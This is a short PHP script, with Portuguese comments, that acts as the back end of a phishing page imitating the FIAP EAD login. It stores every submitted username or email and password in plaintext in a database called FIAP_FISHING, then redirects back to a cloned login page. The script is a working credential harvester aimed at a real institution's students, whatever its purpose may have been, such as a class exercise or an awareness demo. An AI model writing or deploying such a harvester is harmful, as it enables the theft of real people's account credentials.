<?php
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(405);
    exit("Metodo nao permitido.");
}

$usuario = trim($_POST["username"] ?? $_POST["email"] ?? "");
$senha = trim($_POST["password"] ?? $_POST["pass"] ?? "");

if ($usuario === "" || $senha === "") {
    header("Location: FIAP EAD - Login.html?erro=1");
    exit;
}

try {
    $conn = new PDO("mysql:host=localhost;dbname=FIAP_FISHING;charset=utf8mb4", "root", "");
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Sempre registra uma nova tentativa no banco.
    $stmt = $conn->prepare("INSERT INTO TB_USUARIO (LOGIN_US, SENHA_US) VALUES (?, ?)");
    $stmt->execute([$usuario, $senha]);

    header("Location: FIAP EAD - Login.html?ok=1");
    exit;
} catch (PDOException $e) {
    http_response_code(500);
    exit("Erro ao salvar no banco: " . $e->getMessage());
}
?>